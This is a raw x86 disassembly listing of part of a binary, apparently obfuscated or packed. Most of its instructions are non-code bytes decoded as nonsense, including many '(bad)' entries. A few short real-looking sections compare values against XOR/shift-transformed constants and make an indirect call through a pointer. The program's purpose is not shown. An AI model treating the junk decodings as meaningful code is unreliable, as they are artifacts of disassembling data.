  41ac58:	xchg   edi,eax
  41ac59:	add    bl,BYTE PTR ds:0xcb7de75d
  41ac5f:	rcl    BYTE PTR [esp+eax*8],1
  41ac62:	call   0x58a8:0x649d4aa6
  41ac69:	add    ah,BYTE PTR [ebx+0x69]
  41ac6c:	retf   
  41ac6d:	lods   al,BYTE PTR ds:[esi]
  41ac6e:	adc    al,0xdc
  41ac70:	scas   al,BYTE PTR es:[edi]
  41ac71:	sub    DWORD PTR [esi+edi*4-0x6a],edi
  41ac75:	into   
  41ac76:	add    eax,0x328dc9cf
  41ac7b:	lods   eax,DWORD PTR ds:[esi]
  41ac7c:	into   
  41ac7d:	aad    0xef
  41ac7f:	dec    ebp
  41ac80:	scas   al,BYTE PTR es:[edi]
  41ac81:	ror    BYTE PTR [edx+ebp*4],cl
  41ac84:	in     al,dx
  41ac85:	lods   al,BYTE PTR ds:[esi]
  41ac86:	or     edx,edx
  41ac88:	mov    ds:0x652b960d,al
  41ac8d:	ret    
  41ac8e:	cmp    esi,ebp
  41ac90:	ret    0x1bd0
  41ac93:	sbb    DWORD PTR [eax-0x3e],0x95c197dc
  41ac9a:	xor    DWORD PTR [ebx+0x6b634c2b],edi
  41aca0:	leave  
  41aca1:	push   eax
  41aca2:	xchg   BYTE PTR ds:0x7e11a98b,dl
  41aca8:	cli    
  41aca9:	push   0xffffffce
  41acab:	pop    esi
  41acac:	aaa    
  41acad:	ret    0x297b
  41acb0:	leave  
  41acb1:	push   0xa106f5eb
  41acb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acb7:	addr16 mov bh,dl
  41acba:	xchg   ebp,eax
  41acbb:	dec    ecx
  41acbc:	xor    bl,ah
  41acbe:	je     0x41acd8
  41acc0:	ret    0xfb9d
  41acc3:	adc    esp,DWORD PTR [ebp+0xf]
  41acc6:	inc    ebx
  41acc7:	iret   
  41acc8:	lock loope 0x41ac4d
  41accb:	outs   dx,DWORD PTR ds:[esi]
  41accc:	mov    ds:0x488e8e66,eax
  41acd1:	jge    0x41acdf
  41acd3:	in     eax,dx
  41acd4:	inc    ecx
  41acd5:	dec    ecx
  41acd6:	sti    
  41acd7:	loop   0x41ad18
  41acd9:	stos   BYTE PTR es:[edi],al
  41acda:	add    al,0xa0
  41acdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acdd:	add    al,0x0
  41acdf:	jmp    0xca922368
  41ace4:	adc    esp,edi
  41ace6:	jge    0x41ad67
  41ace8:	jge    0x41acf4
  41acea:	lods   al,BYTE PTR ds:[esi]
  41aceb:	ror    al,cl
  41aced:	jecxz  0x41ac74
  41acef:	jae    0x41ac73
  41acf1:	cld    
  41acf2:	xchg   ebp,eax
  41acf3:	inc    edi
  41acf4:	push   esi
  41acf5:	push   edi
  41acf6:	push   ecx
  41acf7:	addr16 dec edi
  41acf9:	and    eax,0xcd549b49
  41acfe:	jmp    0x2bafe7a7
  41ad03:	mov    esi,0xdd5d0782
  41ad08:	push   ss
  41ad09:	fbstp  TBYTE PTR [ebp-0x59987eb1]
  41ad0f:	push   cs
  41ad10:	sub    eax,0x334ef98d
  41ad15:	arpl   WORD PTR [ecx],sp
  41ad17:	inc    edi
  41ad18:	call   0x31091645
  41ad1d:	jp     0x41ad4f
  41ad1f:	sahf   
  41ad20:	cli    
  41ad21:	les    edi,FWORD PTR [ebx+0x71]
  41ad24:	xchg   edi,eax
  41ad25:	test   eax,0x6bb806d0
  41ad2a:	fld    DWORD PTR [ecx]
  41ad2c:	inc    eax
  41ad2d:	adc    BYTE PTR [ebx],bh
  41ad2f:	jb     0x41ad08
  41ad31:	stc    
  41ad32:	ins    BYTE PTR es:[edi],dx
  41ad33:	and    BYTE PTR [ebp+0x6c34e28b],cl
  41ad39:	and    DWORD PTR [edx+0x22b82049],edx
  41ad3f:	popa   
  41ad40:	jp     0x41ad01
  41ad42:	and    eax,0xe7e427e3
  41ad47:	das    
  41ad48:	pop    es
  41ad49:	pop    es
  41ad4a:	jle    0x41ad93
  41ad4c:	(bad)  
  41ad4e:	mov    esp,0x53620759
  41ad53:	sub    ax,bx
  41ad56:	inc    esp
  41ad57:	cli    
  41ad58:	jo     0x41ad23
  41ad5a:	cmp    edx,DWORD PTR [edx-0xa]
  41ad5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad5e:	add    DWORD PTR [ebp+ebp*2-0x5],esi
  41ad62:	inc    ecx
  41ad63:	ins    DWORD PTR es:[edi],dx
  41ad64:	cmp    ch,0x22
  41ad67:	in     al,0xe4
  41ad69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad6a:	or     esp,DWORD PTR [ebp-0x45]
  41ad6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad6e:	add    al,0x6b
  41ad70:	pop    ecx
  41ad71:	pop    eax
  41ad72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad73:	add    al,0x95
  41ad75:	shl    edi,1
  41ad77:	add    ecx,DWORD PTR [ebp-0x57]
  41ad7a:	xor    al,0x82
  41ad7c:	sti    
  41ad7d:	daa    
  41ad7e:	mov    ebx,0xf2d82860
  41ad83:	out    0xeb,al
  41ad85:	jnp    0x41ae06
  41ad87:	pushf  
  41ad88:	cmp    BYTE PTR [edi+0x5b3149fc],bl
  41ad8e:	push   ebp
  41ad8f:	aas    
  41ad90:	or     eax,0x26f844c1
  41ad95:	test   BYTE PTR [edx+0x5],ah
  41ad98:	int    0xc9
  41ad9a:	enter  0xa876,0xdf
  41ad9e:	add    BYTE PTR [bx-0x17],bl
  41ada2:	sbb    al,0x16
  41ada4:	xchg   dl,dl
  41ada6:	mov    ebp,0x430c682c
  41adab:	xor    BYTE PTR [esp+edx*1-0x64d36f67],cl
  41adb2:	lods   al,BYTE PTR ds:[esi]
  41adb3:	sbb    eax,0xc04a9d82
  41adb8:	xchg   BYTE PTR [ebx-0x1e],dl
  41adbb:	sub    al,0x2b
  41adbd:	cmc    
  41adbe:	(bad)  [edi-0x5163d2b9]
  41adc4:	cli    
  41adc5:	add    bh,BYTE PTR ds:0xe34a1bfb
  41adcb:	xor    DWORD PTR [ebx+0x78740ca0],edi
  41add1:	mov    bh,0xbb
  41add3:	inc    esi
  41add4:	xor    BYTE PTR [edi+0x63b91ac7],dh
  41adda:	cs ins BYTE PTR es:[edi],dx
  41addc:	sbb    eax,0xf26e4cc0
  41ade1:	pop    ebx
  41ade2:	mov    ecx,0x56238158
  41ade7:	jge    0x41adc1
  41ade9:	sbb    dl,BYTE PTR [ecx+esi*1]
  41adec:	mov    eax,ds:0x58fba0c6
  41adf1:	mov    ecx,0xa60d94d4
  41adf6:	inc    ebp
  41adf7:	loop   0x41ae58
  41adf9:	dec    edx
  41adfa:	outs   dx,BYTE PTR ds:[esi]
  41adfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adfc:	rcl    DWORD PTR [ebp-0x41a80938],1
  41ae02:	adc    cl,al
  41ae04:	cmp    BYTE PTR [ebx+0x11],bl
  41ae07:	enter  0x16ef,0x9e
  41ae0b:	sub    dh,BYTE PTR [eax-0x4d]
  41ae0e:	fdiv   QWORD PTR [ecx+0x47]
  41ae11:	imul   ecx,DWORD PTR [esi+0x55],0xfa32dc4
  41ae18:	mov    al,0xcc
  41ae1a:	jae    0x41adea
  41ae1c:	sbb    bh,BYTE PTR [esi-0x26c10ece]
  41ae22:	int3   
  41ae23:	fisubr WORD PTR [ebx]
  41ae25:	push   edx
  41ae26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae27:	jbe    0x41ae18
  41ae29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae2a:	call   FWORD PTR [edx]
  41ae2c:	cmp    DWORD PTR [edx-0x61],esp
  41ae2f:	vmaxps xmm2,xmm0,XMMWORD PTR [ebx-0x1769727]
  41ae38:	leave  
  41ae39:	jne    0x41ae47
  41ae3b:	or     bl,0xa1
  41ae3e:	cmp    al,0x25
  41ae40:	(bad)  
  41ae41:	out    dx,al
  41ae42:	sbb    al,0x7d
  41ae44:	daa    
  41ae45:	jp     0x41ae8e
  41ae47:	loope  0x41ae24
  41ae49:	pop    edi
  41ae4a:	or     edx,DWORD PTR [edi]
  41ae4c:	pop    edi
  41ae4d:	in     al,0xf4
  41ae4f:	inc    esp
  41ae50:	in     eax,dx
  41ae51:	mov    ecx,0x602d8ed1
  41ae56:	dec    eax
  41ae57:	dec    ebx
  41ae58:	sub    cl,BYTE PTR [ecx+0x63d72baa]
  41ae5e:	enter  0x1913,0xbf
  41ae62:	lds    ebp,FWORD PTR [ebx+0x2d]
  41ae65:	loope  0x41ae91
  41ae67:	add    BYTE PTR [eax],al
  41ae69:	and    eax,0x6f90
  41ae6e:	mov    DWORD PTR [esp+0x30],eax
  41ae72:	mov    DWORD PTR [esp+0x10],0x1515
  41ae7a:	mov    eax,DWORD PTR [esp+0x10]
  41ae7e:	jmp    0x41b0db
  41ae83:	sub    al,0xff
  41ae85:	jmp    0xe1b3:0xbcbce956
  41ae8c:	in     al,0x38
  41ae8e:	xchg   edx,eax
  41ae8f:	inc    ebx
  41ae90:	push   edi
  41ae91:	jecxz  0x41ae23
  41ae93:	jecxz  0x41aec6
  41ae95:	sar    BYTE PTR [esi-0x41413dcb],0x0
  41ae9c:	adc    dl,BYTE PTR [ebx-0x3c]
  41ae9f:	shl    cl,1
  41aea1:	mov    DWORD PTR [eax-0x4],ebp
  41aea4:	das    
  41aea5:	push   esi
  41aea7:	add    dh,BYTE PTR [ebp-0x1]
  41aeaa:	fdivr  QWORD PTR [eax-0x77]
  41aead:	xor    edi,ebp
  41aeaf:	add    eax,0x31a64a90
  41aeb4:	outs   dx,BYTE PTR ds:[esi]
  41aeb5:	outs   dx,BYTE PTR ds:[esi]
  41aeb6:	and    DWORD PTR [edi],ecx
  41aeb8:	push   0xffffff90
  41aeba:	push   cs
  41aebb:	int3   
  41aebc:	or     edx,ecx
  41aebe:	pushf  
  41aebf:	add    ecx,ebx
  41aec1:	bound  edi,QWORD PTR [ebx-0xe]
  41aec4:	fmul   QWORD PTR [edi+edx*2-0x5953d2c5]
  41aecb:	xchg   ebp,eax
  41aecc:	test   ch,0x14
  41aecf:	hlt    
  41aed0:	icebp  
  41aed1:	ret    0x4beb
  41aed4:	jmp    0xac7d:0x697467dd
  41aedb:	mov    edi,0xdb5dbf65
  41aee0:	cmc    
  41aee1:	and    al,0xbe
  41aee3:	(bad)  
  41aee4:	in     al,dx
  41aee5:	aaa    
  41aee6:	ret    
  41aee7:	iret   
  41aee8:	mov    ah,0xfa
  41aeea:	inc    esi
  41aeeb:	jmp    0x4831e8a7
  41aef0:	scas   al,BYTE PTR es:[edi]
  41aef1:	mov    ebp,0xce08c7bd
  41aef6:	pop    DWORD PTR [edi+0x18dc724d]
  41aefc:	(bad)  
  41aefe:	mov    DWORD PTR [edi-0x50e88cf],0xdbdfba3
  41af08:	push   0xffffffe9
  41af0a:	add    BYTE PTR [edx-0x48129f2a],cl
  41af10:	test   al,0x2d
  41af12:	sbb    eax,edi
  41af14:	pop    ss
  41af15:	inc    ecx
  41af16:	and    DWORD PTR [eax-0x11275041],0x11
  41af1d:	fnsave [edi+esi*4]
  41af20:	adc    DWORD PTR [ebx+0x5bbae863],esi
  41af26:	call   0x1574:0xa8f40bb4
  41af2d:	(bad)  
  41af2e:	xchg   ebp,eax
  41af2f:	fwait
  41af30:	dec    ebp
  41af31:	cmp    cl,cl
  41af33:	adc    DWORD PTR [edx],edx
  41af35:	je     0x41af43
  41af37:	push   ds
  41af38:	pusha  
  41af39:	cmp    eax,0x9e7d3a50
  41af3e:	nop
  41af3f:	push   esp
  41af40:	xor    bl,BYTE PTR [ecx+ebx*1]
  41af43:	call   0x984a:0x66635722
  41af4a:	jne    0x41af45
  41af4c:	nop
  41af4d:	aam    0x98
  41af4f:	add    DWORD PTR [ecx],ebp
  41af51:	stos   BYTE PTR es:[edi],al
  41af52:	adc    eax,0xadd73c3d
  41af57:	mov    ah,0x2c
  41af59:	test   ch,dl
  41af5b:	sbb    bl,bl
  41af5d:	shr    BYTE PTR [eax],0x8f
  41af60:	call   0x9bd1:0xe384599c
  41af67:	mov    dh,0xe8
  41af69:	adc    eax,0x5b2f4336
  41af6e:	push   esi
  41af6f:	(bad)  
  41af70:	jne    0x41af89
  41af72:	or     ebp,0xfffffff0
  41af75:	adc    ch,cl
  41af77:	push   esp
  41af78:	cdq    
  41af79:	es in  eax,0x91
  41af7c:	pop    ds
  41af7d:	push   0xcdc0df8a
  41af82:	lock inc esp
  41af84:	push   ecx
  41af85:	call   0x7d9d808
  41af8a:	jmp    0x85dc24ea
  41af8f:	mov    bh,0xa3
  41af91:	xchg   ecx,eax
  41af92:	mov    dl,0x8c
  41af94:	stc    
  41af95:	outs   dx,DWORD PTR ds:[esi]
  41af96:	mov    ah,0x80
  41af98:	mov    ah,0x84
  41af9a:	mov    ch,0xc4
  41af9c:	test   BYTE PTR [edi+0x61049685],bh
  41afa2:	sub    cl,BYTE PTR [ebp-0x27]
  41afa5:	mov    BYTE PTR [esi-0xf],bl
  41afa8:	pusha  
  41afa9:	in     al,dx
  41afaa:	sub    DWORD PTR [edx+ecx*8+0xf979c8c],esi
  41afb1:	rcl    BYTE PTR [edx-0x5882f120],0x35
  41afb8:	inc    esp
  41afb9:	inc    esi
  41afba:	pop    ecx
  41afbb:	daa    
  41afbc:	fist   WORD PTR [edx+ecx*4]
  41afbf:	sbb    eax,0xda4856bb
  41afc4:	mov    bh,bl
  41afc6:	mov    edx,0xc813b178
  41afcb:	xor    BYTE PTR [edx+0x26a70d07],ah
  41afd1:	mov    cl,0xea
  41afd3:	mov    esp,0x182d0282
  41afd8:	das    
  41afd9:	mov    eax,ds:0x78a0de57
  41afde:	push   0xffffffe4
  41afe0:	xchg   ebx,eax
  41afe1:	lea    ebx,[eax]
  41afe3:	inc    eax
  41afe4:	mov    cl,BYTE PTR [ecx+0x29920b18]
  41afea:	mov    eax,0x704a07ba
  41afef:	inc    ebp
  41aff0:	xchg   ecx,eax
  41aff1:	(bad)  
  41aff2:	loopne 0x41b01b
  41aff4:	adc    al,0x74
  41aff6:	push   eax
  41aff7:	sbb    ebx,DWORD PTR [eax-0x46]
  41affa:	push   cs
  41affb:	pop    ecx
  41affc:	pop    ss
  41affd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41affe:	imul   ecx,DWORD PTR [ebx+0x61de992],0xffffff84
  41b005:	inc    esp
  41b006:	mov    cl,0xcb
  41b008:	pop    ds
  41b009:	pop    edi
  41b00a:	mov    ebx,0x7ffce517
  41b00f:	and    al,0xa9
  41b011:	test   eax,0x3c59ebf9
  41b016:	repnz cwde 
  41b018:	xchg   ebx,eax
  41b019:	dec    esp
  41b01a:	mov    esi,0x85018f1f
  41b01f:	fwait
  41b020:	out    0x90,al
  41b022:	js     0x41afa9
  41b024:	xor    bl,BYTE PTR [edx]
  41b026:	cmp    al,bl
  41b028:	adc    BYTE PTR [ebp+0x5f52c233],ah
  41b02e:	int3   
  41b02f:	xlat   BYTE PTR ds:[ebx]
  41b030:	mov    esp,0xfc097727
  41b035:	lods   al,BYTE PTR ds:[esi]
  41b036:	aad    0x31
  41b038:	pop    ecx
  41b039:	das    
  41b03a:	adc    ah,BYTE PTR [edi-0x3898856]
  41b040:	mov    edx,0xfe82dad4
  41b045:	call   0xea1f9e43
  41b04a:	sahf   
  41b04b:	sub    eax,0x60b7e5d9
  41b050:	jo     0x41b08e
  41b052:	sub    ebp,DWORD PTR [eax+0x23]
  41b055:	xchg   esi,eax
  41b056:	retf   
  41b057:	stc    
  41b058:	sub    eax,0x4f411c94
  41b05d:	dec    edx
  41b05e:	mov    eax,0xf289d96f
  41b063:	das    
  41b064:	ds inc edx
  41b066:	jg     0x41b0b0
  41b068:	adc    ebp,ebx
  41b06a:	or     ecx,ecx
  41b06c:	xchg   BYTE PTR [eax+0x36],dl
  41b06f:	rol    DWORD PTR [esi-0x2c25dd2],1
  41b075:	icebp  
  41b076:	xchg   ecx,eax
  41b077:	inc    eax
  41b078:	push   es
  41b079:	inc    ebp
  41b07a:	imul   ecx,DWORD PTR [ecx],0x77
  41b07d:	push   edi
  41b07e:	xchg   edx,eax
  41b07f:	les    ebp,FWORD PTR [ebp-0x3d]
  41b082:	(bad)  
  41b083:	repz pop ecx
  41b085:	push   edi
  41b086:	sub    dl,BYTE PTR [edx-0x9]
  41b089:	cmp    BYTE PTR ds:0x5b791865,bl
  41b08f:	pop    ds
  41b090:	add    eax,0xb8013597
  41b095:	mov    bh,0xbc
  41b097:	sub    eax,0x15a8bceb
  41b09c:	xchg   edi,eax
  41b09d:	cmp    eax,ebp
  41b09f:	mov    ecx,0x836b4f27
  41b0a4:	xor    ch,BYTE PTR [edi+0x4c8be84]
  41b0aa:	xchg   esi,eax
  41b0ab:	mov    ebp,0xcebd4169
  41b0b0:	push   ebp
  41b0b1:	lods   al,BYTE PTR ds:[esi]
  41b0b2:	(bad)  
  41b0b5:	push   esp
  41b0b6:	gs pop edi
  41b0b8:	test   DWORD PTR [edx],eax
  41b0ba:	mov    cl,0xcc
  41b0bc:	or     BYTE PTR [edi-0x20],al
  41b0bf:	xchg   edx,eax
  41b0c0:	call   0xcafdd94
  41b0c5:	jmp    0x41b07a
  41b0c7:	shl    DWORD PTR [esi-0x58],0xad
  41b0cb:	rcr    BYTE PTR [edx+0x5e98484d],0x5a
  41b0d2:	ret    0xc9ae
  41b0d5:	pop    es
  41b0d6:	shr    DWORD PTR [edx],0x29
  41b0d9:	(bad)  
  41b0da:	mov    ecx,DWORD PTR ss:[esp+0x30]
  41b0df:	or     eax,0x7113
  41b0e4:	add    eax,0x3d6a
  41b0e9:	cmp    ecx,eax
  41b0eb:	je     0x41b438
  41b0f1:	mov    eax,DWORD PTR [esp+0x40]
  41b0f5:	mov    edx,DWORD PTR [esp+0x18]
  41b0f9:	mov    edi,DWORD PTR [esp+0x1c]
  41b0fd:	xor    ecx,ecx
  41b0ff:	shld   ecx,eax,0x2
  41b103:	shl    eax,0x2
  41b106:	xor    eax,ebx
  41b108:	xor    ecx,esi
  41b10a:	cmp    eax,edx
  41b10c:	jne    0x41b11a
  41b112:	cmp    ecx,edi
  41b114:	je     0x41b3f1
  41b11a:	mov    eax,DWORD PTR [esp+0x44]
  41b11e:	mov    eax,DWORD PTR [esp+0x44]
  41b122:	mov    eax,DWORD PTR [esp+0x44]
  41b126:	mov    ecx,DWORD PTR [esp+0x44]
  41b12a:	jmp    0x41b387
  41b12f:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b131:	lea    ecx,[ecx-0x67]
  41b134:	jnp    0x41b171
  41b136:	mov    bh,0x0
  41b138:	lods   al,BYTE PTR ds:[esi]
  41b139:	dec    esp
  41b13a:	xchg   edx,eax
  41b13b:	cmp    al,0x2e
  41b13d:	mov    ds:0xc0355c90,al
  41b142:	mov    esi,0xbebec235
  41b147:	pop    edi
  41b148:	mov    bh,0x56
  41b14a:	ret    0x5bc
  41b14d:	outs   dx,DWORD PTR ds:[esi]
  41b14e:	mov    BYTE PTR es:[esi-0x6e8d82ed],al
  41b155:	pop    esp
  41b156:	lea    edi,[esi-0x54]
  41b159:	rcl    BYTE PTR [ebx-0x4a],1
  41b15c:	sbb    al,BYTE PTR [esp+edi*2-0x40]
  41b160:	inc    DWORD PTR [eax]
  41b162:	push   ebp
  41b163:	retf   0xe336
  41b166:	ds (bad) 
  41b169:	imul   ecx,ebp,0xf2390a6a
  41b16f:	and    dl,BYTE PTR [ebx+0x1ab44485]
  41b175:	scas   eax,DWORD PTR es:[edi]
  41b176:	xor    BYTE PTR [ebp+0x295bac21],0xbd
  41b17d:	test   BYTE PTR ds:0xea9d6acf,dh
  41b183:	mov    bh,BYTE PTR [ecx-0x16]
  41b186:	dec    DWORD PTR [esi]
  41b188:	jmp    0x41b1f2
  41b18a:	or     DWORD PTR [ecx-0x51],ecx
  41b18d:	inc    ebx
  41b18e:	arpl   si,bp
  41b190:	push   0x59416559
  41b195:	adc    eax,0xb4420f1c
  41b19a:	sub    al,0x97
  41b19c:	cli    
  41b19d:	(bad)  
  41b19e:	inc    ecx
  41b19f:	adc    eax,0xe404a9c8
  41b1a4:	jae    0x41b1ca
  41b1a6:	push   cs
  41b1a7:	addr16 inc esp
  41b1a9:	cdq    
  41b1aa:	gs rcr ebp,cl
  41b1ad:	inc    ebp
  41b1ae:	(bad)  [ebx-0x16]
  41b1b1:	dec    ecx
  41b1b2:	loop   0x41b1b8
  41b1b4:	jns    0x41b142
  41b1b6:	(bad)  
  41b1b7:	adc    esi,esi
  41b1b9:	leave  
  41b1ba:	sub    BYTE PTR cs:[edi-0x194e1df4],bl
  41b1c1:	mov    esp,0x66c889d
  41b1c6:	mov    dl,0x71
  41b1c8:	sahf   
  41b1c9:	scas   eax,DWORD PTR es:[edi]
  41b1ca:	mov    cl,0x18
  41b1cc:	ret    0xa907
  41b1cf:	mov    cs,esp
  41b1d1:	dec    ecx
  41b1d2:	out    0xae,al
  41b1d4:	test   esi,edx
  41b1d6:	(bad)  
  41b1d7:	jecxz  0x41b247
  41b1d9:	aad    0xb6
  41b1db:	pop    ds
  41b1dc:	xchg   BYTE PTR [eax-0x7e],al
  41b1df:	mov    esp,0x6637d7d1
  41b1e4:	mov    ds:0x833b1878,eax
  41b1e9:	bound  eax,QWORD PTR [eax]
  41b1eb:	mov    ds:0x614a605,eax
  41b1f0:	sub    eax,0x642a553f
  41b1f5:	js     0x41b1a1
  41b1f7:	aas    
  41b1f8:	mov    bl,0x1f
  41b1fa:	sbb    eax,0xd6c59f4e
  41b1ff:	int    0x3a
  41b201:	test   BYTE PTR [esi+0xf],cl
  41b204:	sbb    al,0x3
  41b206:	dec    edx
  41b207:	mov    ebp,edx
  41b209:	pop    ebx
  41b20a:	xchg   ecx,eax
  41b20b:	add    DWORD PTR [eax+0x53],edi
  41b20e:	ss pop esi
  41b210:	pop    ds
  41b211:	inc    esp
  41b212:	in     al,0x2f
  41b214:	xchg   BYTE PTR [edi-0xb829f27],bl
  41b21a:	xchg   ebx,eax
  41b21b:	jmp    0x41b1b7
  41b21d:	add    cl,ah
  41b21f:	jne    0x41b274
  41b221:	dec    esi
  41b222:	cmp    BYTE PTR [ebp-0x3c],0x1b
  41b226:	add    DWORD PTR [esi-0x7b852347],edi
  41b22c:	aam    0x11
  41b22e:	sbb    DWORD PTR [ebx],eax
  41b230:	jecxz  0x41b2a2
  41b232:	imul   eax,DWORD PTR [ebp+0x4e],0x1dc69395
  41b239:	adc    eax,0x22870b89
  41b23e:	sbb    al,0xb3
  41b240:	outs   dx,BYTE PTR ds:[esi]
  41b241:	adc    al,0xc3
  41b243:	(bad)  
  41b244:	data16 shr bl,cl
  41b247:	and    eax,0xfd9f44c3
  41b24c:	fisubr WORD PTR [edi+ebp*4]
  41b24f:	mov    WORD PTR [ecx+ebx*2+0x57ed12b2],es
  41b256:	or     DWORD PTR [edx+0x2dcbc9cd],edi
  41b25c:	imul   eax,DWORD PTR [esi],0xffffffee
  41b25f:	inc    eax
  41b260:	or     eax,0xe089e209
  41b265:	inc    esp
  41b266:	aas    
  41b267:	(bad)  
  41b268:	xor    cl,ah
  41b26a:	sbb    esp,DWORD PTR [edi+0x53]
  41b26d:	inc    esi
  41b26e:	dec    esi
  41b26f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b270:	push   ecx
  41b271:	adc    eax,0x74abde3d
  41b276:	jp     0x41b2b0
  41b278:	jge    0x41b2e6
  41b27a:	stos   BYTE PTR es:[edi],al
  41b27b:	cs jnp 0x41b290
  41b27e:	mov    dh,BYTE PTR [edi+0x4c838ef2]
  41b284:	outs   dx,BYTE PTR ds:[esi]
  41b285:	sub    BYTE PTR [ebx],0x44
  41b288:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b289:	gs xor eax,0x35a9f408
  41b28f:	mov    al,0x46
  41b291:	adc    dl,BYTE PTR [esp+eiz*2+0x2d]
  41b295:	call   FWORD PTR [edx]
  41b297:	fiadd  WORD PTR [esi]
  41b299:	and    al,0x5a
  41b29b:	loope  0x41b2ae
  41b29d:	dec    edx
  41b29e:	jnp    0x41b23a
  41b2a0:	cld    
  41b2a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2a2:	fisttp WORD PTR [ebx-0x6d603a3f]
  41b2a8:	mov    ecx,0x858c2e77
  41b2ad:	pop    esi
  41b2ae:	dec    ebp
  41b2af:	es mov dh,0x1
  41b2b2:	fild   WORD PTR [esp+esi*4-0x51f08316]
  41b2b9:	pop    ecx
  41b2ba:	pop    ecx
  41b2bb:	dec    ecx
  41b2bc:	(bad)  
  41b2bd:	sub    BYTE PTR [ebx+0x25],bh
  41b2c0:	add    DWORD PTR [eax],edi
  41b2c2:	or     ah,BYTE PTR ds:0xe45a39d5
  41b2c8:	xchg   ebp,eax
  41b2c9:	js     0x41b269
  41b2cb:	out    dx,al
  41b2cc:	jg     0x41b33b
  41b2ce:	mov    dl,0x98
  41b2d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2d1:	les    ebx,FWORD PTR [ebx-0x300939c9]
  41b2d7:	sub    BYTE PTR [edx+eax*4],bl
  41b2da:	mov    edx,0xc80a430e
  41b2df:	(bad)  
  41b2e0:	rcr    BYTE PTR [ecx+eiz*4+0x78],0xff
  41b2e5:	xor    al,0x34
  41b2e7:	pop    ds
  41b2e8:	sti    
  41b2e9:	dec    edx
  41b2ea:	mov    ebp,tr6
  41b2ed:	dec    edx
  41b2ee:	data16 mov dh,0xcd
  41b2f1:	lea    ebp,[edx+ebp*4+0x69]
  41b2f5:	jg     0x41b2f9
  41b2f7:	dec    eax
  41b2f8:	push   ebx
  41b2f9:	(bad)  
  41b2fa:	loopne 0x41b32b
  41b2fc:	pop    esi
  41b2fd:	lock xor ebp,ebp
  41b300:	call   0x238e448
  41b305:	(bad)  
  41b306:	clc    
  41b307:	inc    esi
  41b308:	aad    0x25
  41b30a:	mov    edi,0xef12e86b
  41b30f:	dec    ecx
  41b310:	leave  
  41b311:	sub    dh,BYTE PTR [esi+0xb84ace2]
  41b317:	add    ah,BYTE PTR [eax]
  41b319:	pushf  
  41b31a:	xchg   ebp,eax
  41b31b:	sti    
  41b31c:	mov    BYTE PTR [ebp-0x70],bh
  41b31f:	mov    DWORD PTR [edx-0x7e],ebp
  41b322:	pop    esi
  41b323:	xchg   esp,eax
  41b324:	mov    ebp,0xd25d8414
  41b329:	mov    ds:0x3e3b03b8,al
  41b32e:	xbegin 0x256cdb20
  41b334:	sbb    DWORD PTR [edi],eax
  41b336:	jg     0x41b353
  41b338:	iret   
  41b339:	jg     0x41b2cb
  41b33b:	int3   
  41b33c:	push   eax
  41b33d:	mov    cl,0x8a
  41b33f:	or     edx,DWORD PTR [edx+0x6ecc1a5a]
  41b345:	mov    edx,0xee31340f
  41b34a:	and    BYTE PTR [ecx+ebx*1],bh
  41b34d:	(bad)  
  41b34e:	pop    edx
  41b34f:	(bad)  
  41b351:	aad    0x67
  41b353:	mov    dh,0x2f
  41b355:	test   ebp,0x370c9af8
  41b35b:	sti    
  41b35c:	mov    esi,0x18ecb1ba
  41b361:	xchg   edi,eax
  41b362:	sub    eax,0x63d0acf
  41b367:	test   eax,0x6340adf1
  41b36c:	xchg   ecx,eax
  41b36d:	pop    esi
  41b36e:	dec    edi
  41b36f:	out    0xe5,al
  41b371:	pop    ecx
  41b372:	fs dec esi
  41b374:	cli    
  41b375:	repnz repnz into 
  41b378:	dec    eax
  41b379:	adc    DWORD PTR [esi+0x2],ebp
  41b37c:	dec    ebp
  41b37d:	dec    edx
  41b37e:	push   edi
  41b37f:	sub    eax,0xcc61e00d
  41b384:	xchg   edx,eax
  41b385:	mov    bl,BYTE PTR [esi*1-0x5af96451]
  41b38c:	xor    ecx,0xfffffffe
  41b38f:	shr    eax,0x2
  41b392:	shl    ecx,0x1e
  41b395:	or     eax,ecx
  41b397:	xor    ecx,ecx
  41b399:	shld   ecx,eax,0x2
  41b39d:	shl    eax,0x2
  41b3a0:	xor    eax,ebx
  41b3a2:	xor    ecx,esi
  41b3a4:	cmp    eax,0xcb79b572
  41b3a9:	jne    0x41b3b7
  41b3af:	cmp    ecx,esi
  41b3b1:	je     0x41b438
  41b3b7:	mov    eax,DWORD PTR [esp+0x60]
  41b3bb:	cdq    
  41b3bc:	mov    eax,DWORD PTR [esp+0x60]
  41b3c0:	mov    ecx,edx
  41b3c2:	cdq    
  41b3c3:	shld   edx,eax,0x2
  41b3c7:	shr    ecx,0x1e
  41b3ca:	xor    edi,edi
  41b3cc:	shl    eax,0x2
  41b3cf:	or     eax,ecx
  41b3d1:	or     edx,edi
  41b3d3:	mov    ecx,edx
  41b3d5:	mov    edx,DWORD PTR [esp+0x18]
  41b3d9:	xor    eax,ebx
  41b3db:	xor    ecx,esi
  41b3dd:	mov    esi,DWORD PTR [esp+0x1c]
  41b3e1:	cmp    edx,eax
  41b3e3:	jne    0x41b3f1
  41b3e9:	cmp    esi,ecx
  41b3eb:	je     0x41b438
  41b3f1:	push   DWORD PTR ds:0x4227f8
  41b3f7:	push   DWORD PTR ds:0x42258c
  41b3fd:	mov    eax,ds:0x422708
  41b402:	mov    eax,DWORD PTR [eax+0x1a4]
  41b408:	push   DWORD PTR [eax]
  41b40a:	mov    eax,DWORD PTR [esp+0x78]
  41b40e:	call   eax
  41b410:	mov    ecx,DWORD PTR ds:0x422708
  41b416:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41b41c:	mov    DWORD PTR [ecx],eax
